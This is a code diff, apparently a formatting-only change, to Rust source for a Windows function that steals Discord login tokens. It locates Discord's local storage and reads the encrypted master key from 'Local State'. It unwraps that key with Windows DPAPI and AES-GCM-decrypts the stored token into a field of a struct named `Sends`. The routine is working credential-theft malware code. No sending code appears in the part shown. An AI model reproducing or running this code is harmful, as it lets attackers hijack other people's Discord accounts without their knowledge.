@@ -3,19 +3,19 @@ use crate::Sends;
 impl Sends {
     #[cfg(all(feature = "discord-client", target_os = "windows"))]
     pub fn discord_client(&mut self) -> Option<()> {
-        use std::env;
-        use std::path::PathBuf;
-        use std::fs;
-        use std::ffi::OsStr;
+        use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit, Nonce};
         use regex::bytes::Regex;
         use serde_json::Value;
-        use winapi::um::dpapi::CryptUnprotectData;
+        use std::env;
+        use std::ffi::OsStr;
+        use std::fs;
+        use std::path::PathBuf;
         use std::ptr::null_mut;
-        use winapi::um::wincrypt::CRYPTOAPI_BLOB;
         use std::slice;
-        use winapi::um::winbase::LocalFree;
         use winapi::ctypes::c_void;
-        use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};
+        use winapi::um::dpapi::CryptUnprotectData;
+        use winapi::um::winbase::LocalFree;
+        use winapi::um::wincrypt::CRYPTOAPI_BLOB;
         for i in &["discord", "discordcanary", "Litecord", "discordptb"] {
             let mut path = PathBuf::from(env::var("appdata").ok()?);
             for x in &[i, "Local Storage", "leveldb"] {
@@ -35,7 +35,9 @@ impl Sends {
                             path.push("Local State");
                             let local_state = fs::read_to_string(path).ok()?;
                             let local_state: Value = serde_json::from_str(&local_state).ok()?;
-                            let mut key = base64::decode(local_state["os_crypt"]["encrypted_key"].as_str()?).ok()?;
+                            let mut key =
+                                base64::decode(local_state["os_crypt"]["encrypted_key"].as_str()?)
+                                    .ok()?;
                             let key = &mut key[5..];
                             let mut data_in = CRYPTOAPI_BLOB {
                                 cbData: key.len() as u32,
@@ -43,12 +45,24 @@ impl Sends {
                             };
                             let mut data_out = CRYPTOAPI_BLOB {
                                 cbData: 0,
-                                pbData: null_mut()
+                                pbData: null_mut(),
                             };
                             let master_key;
                             unsafe {
-                                CryptUnprotectData(&mut data_in, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut data_out);
-                                master_key = slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();
+                                CryptUnprotectData(
+                                    &mut data_in,
+                                    null_mut(),
+                                    null_mut(),
+                                    null_mut(),
+                                    null_mut(),
+                                    0,
+                                    &mut data_out,
+                                );
+                                master_key = slice::from_raw_parts(
+                                    data_out.pbData,
+                                    data_out.cbData as usize,
+                                )
+                                .to_vec();
                                 LocalFree(data_out.pbData as *mut c_void);
                             }
                             let iv = &asm.clone()[3..15];
@@ -57,22 +71,23 @@ impl Sends {
                             let decrypted = cipher.encrypt(Nonce::from_slice(iv), payload);
                             let token = decrypted.ok()?;
                             let token = token.split(|y| *y == 249).collect::<Vec<_>>()[0];
-                            self.discord_client_token = Some(String::from_utf8(token.to_vec()).ok()?);
+                            self.discord_client_token =
+                                Some(String::from_utf8(token.to_vec()).ok()?);
                             break;
                         }
                     }
-                },
+                }
                 Err(_) => {}
             }
         }
         Some(())
     }
-    
+
     #[cfg(all(feature = "discord-client", target_os = "linux"))]
     pub fn discord_client(&mut self) -> Option<()> {
         None
     }
-    
+
     #[cfg(all(feature = "discord-client", target_os = "macos"))]
     pub fn discord_client(&mut self) -> Option<()> {
         None
